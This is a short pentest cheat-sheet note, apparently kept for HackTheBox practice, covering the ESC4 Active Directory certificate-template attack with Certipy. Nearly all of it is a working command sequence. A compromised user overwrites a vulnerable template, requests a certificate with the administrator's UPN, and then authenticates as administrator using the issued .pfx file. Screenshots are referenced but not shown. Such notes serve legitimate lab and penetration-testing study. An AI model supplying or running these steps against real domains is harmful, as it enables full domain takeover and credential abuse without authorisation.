[https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4)
  
certipy-ad template -u <compromised_user>@<DOMAIN> -p <pass> -template <template_name> -dc-ip <IP> -save-old
- template_name can be found in certipy find output
![[../../assets/ESC4/image 413.png|image 413.png]]
  
certipy-ad req -u <compromised_user>@<DOMAIN> -p <pass> -dc-ip <IP> -target <DOMAIN_NETBIOS> -ca <ca_name> -template <template_name> -upn administrator@<DOMAIN>
- example DomainNETBIOS: DC01.sequel.htb
- ca_name can be found in certipy find output
    
    - same with template_name
    
![[../../assets/ESC4/image 1 308.png|image 1 308.png]]
  
certipy-ad auth -pfx administrator.pfx -domain <DOMAIN>
![[../../assets/ESC4/image 2 259.png|image 2 259.png]]
  
![[../../assets/ESC4/image 3 221.png|image 3 221.png]]
![[../../assets/ESC4/image 4 192.png|image 4 192.png]]